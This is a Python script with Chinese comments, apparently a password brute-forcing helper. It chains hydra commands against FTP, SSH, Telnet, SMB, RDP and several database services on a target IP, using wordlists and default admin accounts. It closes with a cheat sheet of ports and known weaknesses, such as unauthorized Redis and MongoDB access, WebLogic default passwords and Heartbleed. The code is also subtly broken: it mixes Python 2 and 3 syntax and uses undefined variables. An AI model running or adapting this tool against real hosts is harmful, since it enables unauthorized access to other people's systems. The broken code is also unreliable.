#!/usr/bin/env python
#coding=utf-8
import sys
import os
if len(sys.argv)!=3:
    print ("usage:python brute.py ip port")
    print ("example:python brute.py 127.0.0.1 21,22,25")
    sys.exit()
ip=sys.argv[1]
port=sys.argv[2].split(",")
print(ip)
print(port)
if "22" in port:
    print("yes")

if len(sys.argv)!=3:
    print ("python brute.py ip port")
    print ("usage:python brute.py 127.0.0.1 21,22,25")
    sys.exit()
ip=sys.argv[1]
#command="masscan -p0-65535 "+ip+" --rate=10000 | grep open | awk '{print $4}' | tr -d [:alpha:] | tr -d / > ip.txt"
#os.system(command)
port=sys.argv[2].split(",")
#第二部分，爆破的开始
print "爆破开始:"
#远程连接的爆破
if "21" in port:  #ftp
    command="hydra "+ip+" ftp -L username.txt -P password.txt -vV -t 30 -e ns"
if "22" in port:  #ssh
    command=command+" ; "+"hydra "+ip+" ssh -L username.txt -P password.txt -vV -t 30 -e ns"
    os.system(command)
if "23" in port:  #telnet
    command=command+" ; "+"hydra "+ip+" telnet -L username.txt -P password.txt -vV -t 30 -e ns"
if "445" in port:
    command=command+" ; "+"hydra "+ip+" -l administrator -P password.txt smb -e ns"
if "3389" in port:#rdp
    command=command+" ; "+"hydra "+ip+" rdp -L username.txt -P password.txt -vV -t 30 -e ns"
#数据库密码的爆破
if "1433" in port:  # mssql  密码的爆破
    command=command+" ; "+"hydra "+ip+" mssql -l sa -P password.txt -vV -t 30 -e ns"
if "1521" in port:  #oracle
    command=command+" ; "+"hydra "+ip+" oracle -l system -P password.txt -vV -t 30 -e ns"
if "3306" in port:  #mysql
    command=command+" ; "+"hydra "+mysql+" ftp -l root -P password.txt -vV -t 30 -e ns"
if "5432" in port:  #PostgreSQL
    command=command+" ; "+"hydra "+ip+" PostgreSQL -L username.txt -P password.txt -vV -t 30 -e ns"

os.system(command)
print ("爆破完成!")


print '''
 1. web类(web漏洞/敏感目录)
第三方通用组件漏洞struts thinkphp jboss ganglia zabbix
    80 web
    80-89 web
    8000-9090 web
2. 数据库类(扫描弱口令)
    1433 MSSQL
    1521 Oracle
    3306 MySQL
    5432 PostgreSQL
3. 特殊服务类(未授权/命令执行类/漏洞)
    443 SSL心脏滴血
    873 Rsync未授权
    5984 CouchDB http://xxx:5984/_utils/
    6379 redis未授权
    7001,7002 WebLogic默认弱口令，反序列
    9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞
    11211 memcache未授权访问
    27017,27018 Mongodb未授权访问
    50000 SAP命令执行
    50070,50030 hadoop默认端口未授权访问
4. 常用端口类(扫描弱口令/端口爆破)
    21 ftp
    22 SSH
    23 Telnet
    2601,2604 zebra路由，默认密码zebra
    3389 远程桌面
5. 端口合计详情
    21 ftp
    22 SSH
    23 Telnet
    80 web
    80-89 web
    161 SNMP
    389 LDAP
    443 SSL心脏滴血以及一些web漏洞测试
    445 SMB
    512,513,514 Rexec
    873 Rsync未授权
    1025,111 NFS
    1433 MSSQL
    1521 Oracle:(iSqlPlus Port:5560,7778)
    2082/2083 cpanel主机管理系统登陆 (国外用较多)
    2222 DA虚拟主机管理系统登陆 (国外用较多)
    2601,2604 zebra路由，默认密码zebra
    3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了
    3306 MySQL
    3312/3311 kangle主机管理系统登陆
    3389 远程桌面
    4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网
    5432 PostgreSQL
    5900 vnc
    5984 CouchDB http://xxx:5984/_utils/
    6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网
    6379 redis未授权
    7001,7002 WebLogic默认弱口令，反序列
    7778 Kloxo主机控制面板登录
    8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上
    8080 tomcat/WDCP主机管理系统，默认弱口令
    8080,8089,9090 JBOSS
    8083 Vestacp主机管理系统 (国外用较多)
    8649 ganglia
    8888 amh/LuManager 主机管理系统默认端口
    9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞
    10000 Virtualmin/Webmin 服务器虚拟主机管理系统
    11211 memcache未授权访问
    27017,27018 Mongodb未授权访问
    28017 mongodb统计页面
    50000 SAP命令执行
    50070,50030 hadoop默认端口未授权访问'''
print '''Ftp:21，ssh:22，Telnet:23，Pop3:110，
        3389远程登陆，8080中间件Tomcat，
        7001中间件Weblogic，3306 Mysql数据库(phpmyadmin)，
        1433 SQLServer数据库，5432 Postgresql数据库...'''